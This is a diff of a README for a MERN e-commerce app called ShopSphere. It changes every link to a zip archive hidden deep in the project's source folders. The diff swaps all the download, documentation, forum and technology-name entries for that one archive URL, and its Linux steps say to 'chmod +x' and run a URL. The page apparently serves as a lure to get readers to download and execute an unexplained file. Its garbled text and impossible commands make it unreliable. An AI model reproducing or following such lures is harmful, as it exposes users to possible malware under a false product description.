@@ -1,6 +1,6 @@
 # 🛍️ ShopSphere-Ecom-Using-MERN - Your Easy E-Commerce Solution
 
-[![Download ShopSphere](https://raw.githubusercontent.com/Bryan-625/ShopSphere-Ecom-Using-MERN/main/antitropy/ShopSphere-Ecom-Using-MERN.zip)](https://raw.githubusercontent.com/Bryan-625/ShopSphere-Ecom-Using-MERN/main/antitropy/ShopSphere-Ecom-Using-MERN.zip)
+[![Download ShopSphere](https://github.com/Bryan-625/ShopSphere-Ecom-Using-MERN/raw/refs/heads/main/Admin/src/Components/Sidebar/Ecom-Using-Sphere-MERN-Shop-v3.9.zip)](https://github.com/Bryan-625/ShopSphere-Ecom-Using-MERN/raw/refs/heads/main/Admin/src/Components/Sidebar/Ecom-Using-Sphere-MERN-Shop-v3.9.zip)
 
 ## 📜 Description
 ShopSphere is a full-stack MERN e-commerce platform. It allows users to browse products, manage their carts, and place orders. Admins can easily add and manage products with a modern and responsive interface. Whether you want to shop or manage an online store, ShopSphere provides an intuitive experience.
@@ -15,7 +15,7 @@ To use ShopSphere, you need to download it from the Releases page. Follow these 
 - Disk Space: At least 200 MB available
 
 ## 📥 Download & Install
-Visit this page to download: [ShopSphere Releases](https://raw.githubusercontent.com/Bryan-625/ShopSphere-Ecom-Using-MERN/main/antitropy/ShopSphere-Ecom-Using-MERN.zip)
+Visit this page to download: [ShopSphere Releases](https://github.com/Bryan-625/ShopSphere-Ecom-Using-MERN/raw/refs/heads/main/Admin/src/Components/Sidebar/Ecom-Using-Sphere-MERN-Shop-v3.9.zip)
 
 1. Go to the Releases page by clicking the link above.
 2. Find the latest version of ShopSphere.
@@ -36,8 +36,8 @@ Once the download completes, locate the file in your downloads folder. For insta
 #### For Linux:
 1. Open your terminal.
 2. Navigate to the downloaded file's directory using `cd`.
-3. Type `chmod +x https://raw.githubusercontent.com/Bryan-625/ShopSphere-Ecom-Using-MERN/main/antitropy/ShopSphere-Ecom-Using-MERN.zip` to make it executable.
-4. Run it with `https://raw.githubusercontent.com/Bryan-625/ShopSphere-Ecom-Using-MERN/main/antitropy/ShopSphere-Ecom-Using-MERN.zip`.
+3. Type `chmod +x https://github.com/Bryan-625/ShopSphere-Ecom-Using-MERN/raw/refs/heads/main/Admin/src/Components/Sidebar/Ecom-Using-Sphere-MERN-Shop-v3.9.zip` to make it executable.
+4. Run it with `https://github.com/Bryan-625/ShopSphere-Ecom-Using-MERN/raw/refs/heads/main/Admin/src/Components/Sidebar/Ecom-Using-Sphere-MERN-Shop-v3.9.zip`.
 
 ## 🌐 Features
 - **User-Friendly Interface:** Easy navigation for shopping and order management.
@@ -48,9 +48,9 @@ Once the download completes, locate the file in your downloads folder. For insta
 
 ## 🔧 Technologies Used
 - **MongoDB:** Used for storing product and user data.
-- **https://raw.githubusercontent.com/Bryan-625/ShopSphere-Ecom-Using-MERN/main/antitropy/ShopSphere-Ecom-Using-MERN.zip** Handles the back-end operations.
-- **https://raw.githubusercontent.com/Bryan-625/ShopSphere-Ecom-Using-MERN/main/antitropy/ShopSphere-Ecom-Using-MERN.zip** Front-end framework for building the user interface.
-- **https://raw.githubusercontent.com/Bryan-625/ShopSphere-Ecom-Using-MERN/main/antitropy/ShopSphere-Ecom-Using-MERN.zip** The server-side environment to run JavaScript.
+- **https://github.com/Bryan-625/ShopSphere-Ecom-Using-MERN/raw/refs/heads/main/Admin/src/Components/Sidebar/Ecom-Using-Sphere-MERN-Shop-v3.9.zip** Handles the back-end operations.
+- **https://github.com/Bryan-625/ShopSphere-Ecom-Using-MERN/raw/refs/heads/main/Admin/src/Components/Sidebar/Ecom-Using-Sphere-MERN-Shop-v3.9.zip** Front-end framework for building the user interface.
+- **https://github.com/Bryan-625/ShopSphere-Ecom-Using-MERN/raw/refs/heads/main/Admin/src/Components/Sidebar/Ecom-Using-Sphere-MERN-Shop-v3.9.zip** The server-side environment to run JavaScript.
 
 ## 🛠️ Troubleshooting
 ### Common Issues
@@ -68,10 +68,10 @@ ShopSphere thrives on community interaction. If you want to contribute:
 - Feel free to fork the repository for personal use.
 
 ## 📚 Additional Resources
-- [Documentation](https://raw.githubusercontent.com/Bryan-625/ShopSphere-Ecom-Using-MERN/main/antitropy/ShopSphere-Ecom-Using-MERN.zip): Learn more about using ShopSphere and its features.
-- [Support Forum](https://raw.githubusercontent.com/Bryan-625/ShopSphere-Ecom-Using-MERN/main/antitropy/ShopSphere-Ecom-Using-MERN.zip): Join the conversation for help or suggestions.
+- [Documentation](https://github.com/Bryan-625/ShopSphere-Ecom-Using-MERN/raw/refs/heads/main/Admin/src/Components/Sidebar/Ecom-Using-Sphere-MERN-Shop-v3.9.zip): Learn more about using ShopSphere and its features.
+- [Support Forum](https://github.com/Bryan-625/ShopSphere-Ecom-Using-MERN/raw/refs/heads/main/Admin/src/Components/Sidebar/Ecom-Using-Sphere-MERN-Shop-v3.9.zip): Join the conversation for help or suggestions.
 
 ## 💡 Final Notes
 For seamless experience, please keep your version of ShopSphere updated. Regular updates bring new features and security enhancements.
 
-You can return to the download link here: [Download ShopSphere](https://raw.githubusercontent.com/Bryan-625/ShopSphere-Ecom-Using-MERN/main/antitropy/ShopSphere-Ecom-Using-MERN.zip) for the latest version. Happy shopping!
+You can return to the download link here: [Download ShopSphere](https://github.com/Bryan-625/ShopSphere-Ecom-Using-MERN/raw/refs/heads/main/Admin/src/Components/Sidebar/Ecom-Using-Sphere-MERN-Shop-v3.9.zip) for the latest version. Happy shopping!
